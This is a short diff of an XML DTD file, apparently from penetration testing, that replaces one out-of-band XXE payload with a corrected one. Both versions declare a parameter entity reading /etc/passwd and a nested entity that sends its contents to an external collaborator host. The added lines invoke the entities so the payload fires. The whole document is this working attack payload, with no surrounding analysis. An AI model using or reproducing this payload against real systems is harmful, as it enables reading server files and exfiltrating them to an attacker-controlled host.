@@ -1,2 +1,4 @@
-<!ENTITY % data SYSTEM "file:///etc/passwd">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://f3j7760cli690jcqwda1qv17lyrufj.collab.lsg.dev/?%data;'>">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://6ryyvxo399u0oa0hk4ysempy9pfm3b.collab.lsg.dev/?x=%file;'>">
+%eval;
+%exfiltrate;
